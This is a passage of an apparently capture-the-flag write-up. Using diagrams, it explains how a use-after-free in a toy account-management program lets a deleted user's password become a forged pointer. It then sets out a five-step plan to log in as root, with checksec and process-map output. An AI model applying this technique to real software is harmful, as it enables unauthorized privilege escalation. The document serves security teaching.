<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="196,-96.75 196,-121 356,-121 356,-96.75 196,-96.75"/>
<text text-anchor="start" x="201" y="-105.6" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> </text>
<text text-anchor="start" x="204.75" y="-105.6" font-family="Helvetica,Arial,sans-serif" font-weight="bold" font-size="12.00">user_entry 0x100040 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="196,-72.5 196,-96.75 356,-96.75 356,-72.5 196,-72.5"/>
<text text-anchor="start" x="201" y="-80.35" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> user: 0x100060 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="196,-48.25 196,-72.5 356,-72.5 356,-48.25 196,-48.25"/>
<text text-anchor="start" x="201" y="-56.1" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> prev: 0x100000 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="196,-24 196,-48.25 356,-48.25 356,-24 196,-24"/>
<text text-anchor="start" x="201" y="-31.85" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> next: null </text>
</g>
<!-- element0&#45;&gt;element1 -->
<g id="edge1" class="edge">
<title>element0:next&#45;&gt;element1:head</title>
<path fill="none" stroke="black" d="M160,-108.5C171.38,-108.5 176.68,-108.5 184.55,-108.5"/>
<polygon fill="black" stroke="black" points="184.49,-112 194.49,-108.5 184.49,-105 184.49,-112"/>
</g>
<!-- user0 -->
<g id="node3" class="node">
<title>user0</title>
<polygon fill="#0044ff" fill-opacity="0.133333" stroke="none" points="335,-236 217,-236 217,-139 335,-139 335,-236"/>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="217,-211.75 217,-236 335,-236 335,-211.75 217,-211.75"/>
<text text-anchor="start" x="222" y="-220.6" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> </text>
<text text-anchor="start" x="225.75" y="-220.6" font-family="Helvetica,Arial,sans-serif" font-weight="bold" font-size="12.00">user 0x100020 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="217,-187.5 217,-211.75 335,-211.75 335,-187.5 217,-187.5"/>
<text text-anchor="start" x="222" y="-195.35" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> id: 0 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="217,-163.25 217,-187.5 335,-187.5 335,-163.25 217,-163.25"/>
<text text-anchor="start" x="222" y="-171.1" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> username: root </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="217,-139 217,-163.25 335,-163.25 335,-139 217,-139"/>
<text text-anchor="start" x="222" y="-146.85" font-family="Helvetica,Arial,sans-serif" font-size="12.00">password: ???? </text>
</g>
<!-- element0&#45;&gt;user0 -->
<g id="edge3" class="edge">
<title>element0:user&#45;&gt;user0:head</title>
<path fill="none" stroke="black" d="M160,-156.5C194.41,-156.5 181.31,-209.18 204.96,-221.12"/>
<polygon fill="black" stroke="black" points="204.01,-224.49 214.52,-223.18 205.49,-217.65 204.01,-224.49"/>
</g>
<!-- element1&#45;&gt;element0 -->
<g id="edge2" class="edge">
<title>element1:prev&#45;&gt;element0:head</title>
<path fill="none" stroke="black" d="M196,-60.5C144.89,-60.5 204.2,-161.62 171.2,-178.21"/>
<polygon fill="black" stroke="black" points="170.58,-174.76 161.48,-180.2 171.98,-181.62 170.58,-174.76"/>
</g>
<!-- user1 -->
<g id="node4" class="node">
<title>user1</title>
<polygon fill="#0044ff" fill-opacity="0.133333" stroke="none" points="537,-97 392,-97 392,0 537,0 537,-97"/>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="392,-72.75 392,-97 537,-97 537,-72.75 392,-72.75"/>
<text text-anchor="start" x="410.5" y="-81.6" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> </text>
<text text-anchor="start" x="414.25" y="-81.6" font-family="Helvetica,Arial,sans-serif" font-weight="bold" font-size="12.00">user 0x100060 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="392,-48.5 392,-72.75 537,-72.75 537,-48.5 392,-48.5"/>
<text text-anchor="start" x="397" y="-56.35" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> id: 1 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="392,-24.25 392,-48.5 537,-48.5 537,-24.25 392,-24.25"/>
<text text-anchor="start" x="397" y="-32.1" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> username: bob </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="392,0 392,-24.25 537,-24.25 537,0 392,0"/>
<text text-anchor="start" x="397" y="-7.85" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> password: password1 </text>
</g>
<!-- element1&#45;&gt;user1 -->
<g id="edge4" class="edge">
<title>element1:user&#45;&gt;user1:head</title>
<path fill="none" stroke="black" d="M356,-84.5C367.38,-84.5 372.68,-84.5 380.55,-84.5"/>
<polygon fill="black" stroke="black" points="380.49,-88 390.49,-84.5 380.49,-81 380.49,-88"/>
</g>
</g>
</svg></div>

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
 "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<!-- Generated by graphviz version 9.0.0 (20230911.1827)
 -->
<!-- Title: g Pages: 1 -->
<div><svg width="428pt" height="130pt"
 viewBox="0.00 0.00 428.25 130.25" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<g id="graph0" class="graph" transform="scale(1 1) rotate(0) translate(4 126.25)">
<title>g</title>
<polygon fill="white" stroke="none" points="-4,4 -4,-126.25 424.25,-126.25 424.25,4 -4,4"/>
<text text-anchor="middle" x="210.12" y="-7.95" font-family="Helvetica,Arial,sans-serif" font-size="14.00">figure 2. Memory layout after user deletion</text>
<!-- element2 -->
<g id="node1" class="node">
<title>element2</title>
<polygon fill="#880000" fill-opacity="0.133333" stroke="none" points="199,-122.25 0,-122.25 0,-25.25 199,-25.25 199,-122.25"/>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="0,-98 0,-122.25 199,-122.25 199,-98 0,-98"/>
<text text-anchor="start" x="5" y="-106.85" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> </text>
<text text-anchor="start" x="8.75" y="-106.85" font-family="Helvetica,Arial,sans-serif" font-weight="bold" font-size="12.00">recycled memory 0x100080</text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="0,-73.75 0,-98 199,-98 199,-73.75 0,-73.75"/>
<text text-anchor="start" x="5" y="-81.6" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> 0x100040 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="0,-49.5 0,-73.75 199,-73.75 199,-49.5 0,-49.5"/>
<text text-anchor="start" x="5" y="-57.35" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> 0x1000a0 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="0,-25.25 0,-49.5 199,-49.5 199,-25.25 0,-25.25"/>
<text text-anchor="start" x="5" y="-33.1" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> 0 </text>
</g>
<!-- user2 -->
<g id="node2" class="node">
<title>user2</title>
<polygon fill="#880000" fill-opacity="0.133333" stroke="none" points="420.25,-122.25 216.75,-122.25 216.75,-25.25 420.25,-25.25 420.25,-122.25"/>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="216.75,-98 216.75,-122.25 420.25,-122.25 420.25,-98 216.75,-98"/>
<text text-anchor="start" x="221.75" y="-106.85" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> </text>
<text text-anchor="start" x="225.5" y="-106.85" font-family="Helvetica,Arial,sans-serif" font-weight="bold" font-size="12.00">recycled memory 0x1000a0 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="216.75,-73.75 216.75,-98 420.25,-98 420.25,-73.75 216.75,-73.75"/>
<text text-anchor="start" x="221.75" y="-81.6" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> 2 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="216.75,-49.5 216.75,-73.75 420.25,-73.75 420.25,-49.5 216.75,-49.5"/>
<text text-anchor="start" x="221.75" y="-57.35" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> alice </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="216.75,-25.25 216.75,-49.5 420.25,-49.5 420.25,-25.25 216.75,-25.25"/>
<text text-anchor="start" x="221.75" y="-33.1" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> pasword2 </text>
</g>
</g>
</svg></div>

<p>Note that recycled memory is not zeroed out, it still contains data.</p>
<p>Now if we create a new user, recycled memory 0x100080 and 0x1000a0 will be reused for user account and user entry. Note that last
freed blocked in <code>remove_account</code> item will be used first by malloc in sign_up (<abbr title="Last In First Out">LIFO</abbr>, effectively swaping addresses of user_entry and user account).
This change is highlighted compared to <em>figure 1</em>:</p>
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
 "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<!-- Generated by graphviz version 9.0.0 (20230911.1827)
 -->
<!-- Title: g Pages: 1 -->
<div><svg width="741pt" height="269pt"
 viewBox="0.00 0.00 741.00 269.25" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<g id="graph0" class="graph" transform="scale(1 1) rotate(0) translate(4 265.25)">
<title>g</title>
<polygon fill="white" stroke="none" points="-4,4 -4,-265.25 737,-265.25 737,4 -4,4"/>
<text text-anchor="middle" x="366.5" y="-7.95" font-family="Helvetica,Arial,sans-serif" font-size="14.00">figure 3. Memory layout after new user re&#45;creation</text>
<!-- element0 -->
<g id="node1" class="node">
<title>element0</title>
<polygon fill="#88ff00" fill-opacity="0.133333" stroke="none" points="160,-213.25 0,-213.25 0,-116.25 160,-116.25 160,-213.25"/>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="0,-189 0,-213.25 160,-213.25 160,-189 0,-189"/>
<text text-anchor="start" x="5" y="-197.85" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> </text>
<text text-anchor="start" x="8.75" y="-197.85" font-family="Helvetica,Arial,sans-serif" font-weight="bold" font-size="12.00">user_entry 0x100000 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="0,-164.75 0,-189 160,-189 160,-164.75 0,-164.75"/>
<text text-anchor="start" x="5" y="-172.6" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> prev: null </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="0,-140.5 0,-164.75 160,-164.75 160,-140.5 0,-140.5"/>
<text text-anchor="start" x="5" y="-148.35" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> user: 0x100020 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="0,-116.25 0,-140.5 160,-140.5 160,-116.25 0,-116.25"/>
<text text-anchor="start" x="5" y="-124.1" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> next: 0x100040 </text>
</g>
<!-- element1 -->
<g id="node2" class="node">
<title>element1</title>
<polygon fill="#88ff00" fill-opacity="0.133333" stroke="none" points="356,-237.25 196,-237.25 196,-140.25 356,-140.25 356,-237.25"/>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="196,-213 196,-237.25 356,-237.25 356,-213 196,-213"/>
<text text-anchor="start" x="201" y="-221.85" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> </text>
<text text-anchor="start" x="204.75" y="-221.85" font-family="Helvetica,Arial,sans-serif" font-weight="bold" font-size="12.00">user_entry 0x100040 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="196,-188.75 196,-213 356,-213 356,-188.75 196,-188.75"/>
<text text-anchor="start" x="201" y="-196.6" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> prev: 0x100000 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="196,-164.5 196,-188.75 356,-188.75 356,-164.5 196,-164.5"/>
<text text-anchor="start" x="201" y="-172.35" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> user: 0x100060 </text>
<polygon fill="#b2b3b4" fill-opacity="0.666667" stroke="none" points="196,-140.25 196,-164.5 356,-164.5 356,-140.25 196,-140.25"/>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="196,-140.25 196,-164.5 356,-164.5 356,-140.25 196,-140.25"/>
<text text-anchor="start" x="201" y="-148.1" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> next: 0x1000a0 </text>
</g>
<!-- element0&#45;&gt;element1 -->
<g id="edge1" class="edge">
<title>element0:next&#45;&gt;element1:head</title>
<path fill="none" stroke="black" d="M160,-128.75C200.94,-128.75 160.59,-206.24 185.02,-221.98"/>
<polygon fill="black" stroke="black" points="183.98,-225.33 194.53,-224.38 185.69,-218.54 183.98,-225.33"/>
</g>
<!-- user0 -->
<g id="node4" class="node">
<title>user0</title>
<polygon fill="#0044ff" fill-opacity="0.133333" stroke="none" points="335,-122.25 217,-122.25 217,-25.25 335,-25.25 335,-122.25"/>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="217,-98 217,-122.25 335,-122.25 335,-98 217,-98"/>
<text text-anchor="start" x="222" y="-106.85" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> </text>
<text text-anchor="start" x="225.75" y="-106.85" font-family="Helvetica,Arial,sans-serif" font-weight="bold" font-size="12.00">user 0x100020 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="217,-73.75 217,-98 335,-98 335,-73.75 217,-73.75"/>
<text text-anchor="start" x="222" y="-81.6" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> id: 0 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="217,-49.5 217,-73.75 335,-73.75 335,-49.5 217,-49.5"/>
<text text-anchor="start" x="222" y="-57.35" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> username: root </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="217,-25.25 217,-49.5 335,-49.5 335,-25.25 217,-25.25"/>
<text text-anchor="start" x="222" y="-33.1" font-family="Helvetica,Arial,sans-serif" font-size="12.00">password: ???? </text>
</g>
<!-- element0&#45;&gt;user0 -->
<g id="edge5" class="edge">
<title>element0:user&#45;&gt;user0:head</title>
<path fill="none" stroke="black" d="M160,-152.75C186.97,-152.75 185.77,-120.99 204.81,-112.06"/>
<polygon fill="black" stroke="black" points="205.43,-115.51 214.52,-110.06 204.02,-108.65 205.43,-115.51"/>
</g>
<!-- element1&#45;&gt;element0 -->
<g id="edge2" class="edge">
<title>element1:prev&#45;&gt;element0:head</title>
<path fill="none" stroke="black" d="M196,-200.75C184.62,-200.75 179.32,-200.75 171.45,-200.75"/>
<polygon fill="black" stroke="black" points="171.51,-197.25 161.51,-200.75 171.51,-204.25 171.51,-197.25"/>
</g>
<!-- element2 -->
<g id="node3" class="node">
<title>element2</title>
<polygon fill="#88ff00" fill-opacity="0.133333" stroke="none" points="552,-261.25 392,-261.25 392,-164.25 552,-164.25 552,-261.25"/>
<polygon fill="#b2b3b4" fill-opacity="0.666667" stroke="none" points="392,-237 392,-261.25 552,-261.25 552,-237 392,-237"/>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="392,-237 392,-261.25 552,-261.25 552,-237 392,-237"/>
<text text-anchor="start" x="397" y="-245.85" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> </text>
<text text-anchor="start" x="400.75" y="-245.85" font-family="Helvetica,Arial,sans-serif" font-weight="bold" font-size="12.00">user_entry 0x1000a0 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="392,-212.75 392,-237 552,-237 552,-212.75 392,-212.75"/>
<text text-anchor="start" x="397" y="-220.6" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> prev: 0x100040 </text>
<polygon fill="#b2b3b4" fill-opacity="0.666667" stroke="none" points="392,-188.5 392,-212.75 552,-212.75 552,-188.5 392,-188.5"/>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="392,-188.5 392,-212.75 552,-212.75 552,-188.5 392,-188.5"/>
<text text-anchor="start" x="397" y="-196.35" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> user: 0x100080 </text>
<polygon fill="#efdddd" stroke="none" points="392,-164.25 392,-188.5 552,-188.5 552,-164.25 392,-164.25"/>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="392,-164.25 392,-188.5 552,-188.5 552,-164.25 392,-164.25"/>
<text text-anchor="start" x="397" y="-172.1" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> next: password2 </text>
</g>
<!-- element1&#45;&gt;element2 -->
<g id="edge3" class="edge">
<title>element1:next&#45;&gt;element2:head</title>
<path fill="none" stroke="black" d="M356,-152.75C396.94,-152.75 356.59,-230.24 381.02,-245.98"/>
<polygon fill="black" stroke="black" points="379.98,-249.33 390.53,-248.38 381.69,-242.54 379.98,-249.33"/>
</g>
<!-- user1 -->
<g id="node5" class="node">
<title>user1</title>
<polygon fill="#0044ff" fill-opacity="0.133333" stroke="none" points="544.5,-146.25 399.5,-146.25 399.5,-49.25 544.5,-49.25 544.5,-146.25"/>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="399.5,-122 399.5,-146.25 544.5,-146.25 544.5,-122 399.5,-122"/>
<text text-anchor="start" x="418" y="-130.85" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> </text>
<text text-anchor="start" x="421.75" y="-130.85" font-family="Helvetica,Arial,sans-serif" font-weight="bold" font-size="12.00">user 0x100060 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="399.5,-97.75 399.5,-122 544.5,-122 544.5,-97.75 399.5,-97.75"/>
<text text-anchor="start" x="404.5" y="-105.6" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> id: 1 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="399.5,-73.5 399.5,-97.75 544.5,-97.75 544.5,-73.5 399.5,-73.5"/>
<text text-anchor="start" x="404.5" y="-81.35" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> username: bob </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="399.5,-49.25 399.5,-73.5 544.5,-73.5 544.5,-49.25 399.5,-49.25"/>
<text text-anchor="start" x="404.5" y="-57.1" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> password: password1 </text>
</g>
<!-- element1&#45;&gt;user1 -->
<g id="edge6" class="edge">
<title>element1:user&#45;&gt;user1:head</title>
<path fill="none" stroke="black" d="M356,-176.75C378.12,-176.75 374.09,-147.26 387.22,-137.12"/>
<polygon fill="black" stroke="black" points="388.06,-140.53 396.56,-134.2 385.97,-133.85 388.06,-140.53"/>
</g>
<!-- element2&#45;&gt;element1 -->
<g id="edge4" class="edge">
<title>element2:prev&#45;&gt;element1:head</title>
<path fill="none" stroke="black" d="M392,-224.75C380.62,-224.75 375.32,-224.75 367.45,-224.75"/>
<polygon fill="black" stroke="black" points="367.51,-221.25 357.51,-224.75 367.51,-228.25 367.51,-221.25"/>
</g>
<!-- user2 -->
<g id="node6" class="node">
<title>user2</title>
<polygon fill="#0044ff" fill-opacity="0.133333" stroke="none" points="733,-213.25 588,-213.25 588,-116.25 733,-116.25 733,-213.25"/>
<polygon fill="#b2b3b4" fill-opacity="0.666667" stroke="none" points="588,-189 588,-213.25 733,-213.25 733,-189 588,-189"/>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="588,-189 588,-213.25 733,-213.25 733,-189 588,-189"/>
<text text-anchor="start" x="606.5" y="-197.85" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> </text>
<text text-anchor="start" x="610.25" y="-197.85" font-family="Helvetica,Arial,sans-serif" font-weight="bold" font-size="12.00">user 0x100080 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="588,-164.75 588,-189 733,-189 733,-164.75 588,-164.75"/>
<text text-anchor="start" x="593" y="-172.6" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> id: 3 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="588,-140.5 588,-164.75 733,-164.75 733,-140.5 588,-140.5"/>
<text text-anchor="start" x="593" y="-148.35" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> username: james </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="588,-116.25 588,-140.5 733,-140.5 733,-116.25 588,-116.25"/>
<text text-anchor="start" x="593" y="-124.1" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> password: password3 </text>
</g>
<!-- element2&#45;&gt;user2 -->
<g id="edge7" class="edge">
<title>element2:user&#45;&gt;user2:head</title>
<path fill="none" stroke="black" d="M552,-200.75C563.38,-200.75 568.68,-200.75 576.55,-200.75"/>
<polygon fill="black" stroke="black" points="576.49,-204.25 586.49,-200.75 576.49,-197.25 576.49,-204.25"/>
</g>
</g>
</svg></div>

<h3 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h3>
<p>As you can see on figure3, password of deleted user is used as address of the next user entry. So our plan is:</p>
<ol>
<li>Find memory address that can be interpreted as user entry for account with id 0 and username and password that we know.</li>
<li>Create user account using address from step 1 as a password.</li>
<li>Delete the account.</li>
<li>Create new account, this will trigger the exploit and create new entry with uninitialized <code>next</code> value. It will be address we selected in step 1. Not so "undeterminate", huh?</li>
<li>Sign in with username and password that we got in step 1.</li>
</ol>
<p><strong>Step 1</strong>: scan memory</p>
<p>We are looking for address that points to user account structure:
<div class="language-c highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span>
<span class="normal">4</span>
<span class="normal">5</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">long</span><span class="w"> </span><span class="n">uid</span><span class="p">;</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">username</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">password</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
<span class="p">}</span>
</code></pre></div></td></tr></table></div>
Uid should be 0, and username and password any as long as we know it. </p>
<p>Time to check binary protection:
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code>$<span class="w"> </span>checksec<span class="w"> </span>--file<span class="o">=</span>app<span class="w">                        </span>
RELRO<span class="w">           </span>STACK<span class="w"> </span>CANARY<span class="w">      </span>NX<span class="w">            </span>PIE<span class="w">             </span>RPATH<span class="w">      </span>RUNPATH<span class="w">      </span>Symbols<span class="w">         </span>FORTIFY<span class="w"> </span>Fortified<span class="w">       </span>Fortifiable<span class="w">     </span>FILE
Partial<span class="w"> </span>RELRO<span class="w">   </span>Canary<span class="w"> </span>found<span class="w">      </span>NX<span class="w"> </span>enabled<span class="w">    </span>No<span class="w"> </span>PIE<span class="w">          </span>No<span class="w"> </span>RPATH<span class="w">   </span>No<span class="w"> </span>RUNPATH<span class="w">   </span><span class="m">54</span><span class="w"> </span>Symbols<span class="w">        </span>No<span class="w">    </span><span class="m">0</span><span class="w">               </span><span class="m">2</span><span class="w">               </span>app
</code></pre></div></td></tr></table></div></p>
<p><abbr title="Position Independent Executable">PIE</abbr> is disabled. This means code will be loaded always to the same addresses. This looks like the best place to look for pointer to 
user account as its value will be same every time app launched.</p>
<p>Module entry point is 0x400000, we can see it in process mapping:
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span></pre></div></td><td class="code"><div><pre><span></span><code>$<span class="w"> </span>cat<span class="w"> </span>/proc/5539/maps
<span class="hll"><span class="m">00400000</span>-00401000<span class="w"> </span>r--p<span class="w"> </span><span class="m">00000000</span><span class="w"> </span><span class="m">08</span>:01<span class="w"> </span><span class="m">1209740</span><span class="w">                            </span>/home/kali/Downloads/app
</span><span class="m">00401000</span>-00402000<span class="w"> </span>r-xp<span class="w"> </span><span class="m">00001000</span><span class="w"> </span><span class="m">08</span>:01<span class="w"> </span><span class="m">1209740</span><span class="w">                            </span>/home/kali/Downloads/app
<span class="m">00402000</span>-00403000<span class="w"> </span>r--p<span class="w"> </span><span class="m">00002000</span><span class="w"> </span><span class="m">08</span>:01<span class="w"> </span><span class="m">1209740</span><span class="w">                            </span>/home/kali/Downloads/app
<span class="m">00403000</span>-00404000<span class="w"> </span>r--p<span class="w"> </span><span class="m">00002000</span><span class="w"> </span><span class="m">08</span>:01<span class="w"> </span><span class="m">1209740</span><span class="w">                            </span>/home/kali/Downloads/app
<span class="m">00404000</span>-00405000<span class="w"> </span>rw-p<span class="w"> </span><span class="m">00003000</span><span class="w"> </span><span class="m">08</span>:01<span class="w"> </span><span class="m">1209740</span><span class="w">                            </span>/home/kali/Downloads/app
7f70658c0000-7f70658c3000<span class="w"> </span>rw-p<span class="w"> </span><span class="m">00000000</span><span class="w"> </span><span class="m">00</span>:00<span class="w"> </span><span class="m">0</span><span class="w"> </span>
7f70658c3000-7f70658e9000<span class="w"> </span>r--p<span class="w"> </span><span class="m">00000000</span><span class="w"> </span><span class="m">08</span>:01<span class="w"> </span><span class="m">440309</span><span class="w">                     </span>/usr/lib/x86_64-linux-gnu/libc.so.6
7f70658e9000-7f7065a40000<span class="w"> </span>r-xp<span class="w"> </span><span class="m">00026000</span><span class="w"> </span><span class="m">08</span>:01<span class="w"> </span><span class="m">440309</span><span class="w">                     </span>/usr/lib/x86_64-linux-gnu/libc.so.6
7f7065a40000-7f7065a95000<span class="w"> </span>r--p<span class="w"> </span>0017d000<span class="w"> </span><span class="m">08</span>:01<span class="w"> </span><span class="m">440309</span><span class="w">                     </span>/usr/lib/x86_64-linux-gnu/libc.so.6
7f7065a95000-7f7065a99000<span class="w"> </span>r--p<span class="w"> </span>001d1000<span class="w"> </span><span class="m">08</span>:01<span class="w"> </span><span class="m">440309</span><span class="w">                     </span>/usr/lib/x86_64-linux-gnu/libc.so.6
7f7065a99000-7f7065a9b000<span class="w"> </span>rw-p<span class="w"> </span>001d5000<span class="w"> </span><span class="m">08</span>:01<span class="w"> </span><span class="m">440309</span><span class="w">                     </span>/usr/lib/x86_64-linux-gnu/libc.so.6
7f7065a9b000-7f7065aa8000<span class="w"> </span>rw-p<span class="w"> </span><span class="m">00000000</span><span class="w"> </span><span class="m">00</span>:00<span class="w"> </span><span class="m">0</span><span class="w"> </span>
7f7065ac9000-7f7065acb000<span class="w"> </span>rw-p<span class="w"> </span><span class="m">00000000</span><span class="w"> </span><span class="m">00</span>:00<span class="w"> </span><span class="m">0</span><span class="w"> </span>
7f7065acb000-7f7065acc000<span class="w"> </span>r--p<span class="w"> </span><span class="m">00000000</span><span class="w"> </span><span class="m">08</span>:01<span class="w"> </span><span class="m">440306</span><span class="w">                     </span>/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7f7065acc000-7f7065af1000<span class="w"> </span>r-xp<span class="w"> </span><span class="m">00001000</span><span class="w"> </span><span class="m">08</span>:01<span class="w"> </span><span class="m">440306</span><span class="w">                     </span>/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7f7065af1000-7f7065afb000<span class="w"> </span>r--p<span class="w"> </span><span class="m">00026000</span><span class="w"> </span><span class="m">08</span>:01<span class="w"> </span><span class="m">440306</span><span class="w">                     </span>/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7f7065afb000-7f7065afd000<span class="w"> </span>r--p<span class="w"> </span><span class="m">00030000</span><span class="w"> </span><span class="m">08</span>:01<span class="w"> </span><span class="m">440306</span><span class="w">                     </span>/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7f7065afd000-7f7065aff000<span class="w"> </span>rw-p<span class="w"> </span><span class="m">00032000</span><span class="w"> </span><span class="m">08</span>:01<span class="w"> </span><span class="m">440306</span><span class="w">                     </span>/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7ffe04ef5000-7ffe04f16000<span class="w"> </span>rw-p<span class="w"> </span><span class="m">00000000</span><span class="w"> </span><span class="m">00</span>:00<span class="w"> </span><span class="m">0</span><span class="w">                          </span><span class="o">[</span>stack<span class="o">]</span>
7ffe04fc4000-7ffe04fc8000<span class="w"> </span>r--p<span class="w"> </span><span class="m">00000000</span><span class="w"> </span><span class="m">00</span>:00<span class="w"> </span><span class="m">0</span><span class="w">                          </span><span class="o">[</span>vvar<span class="o">]</span>
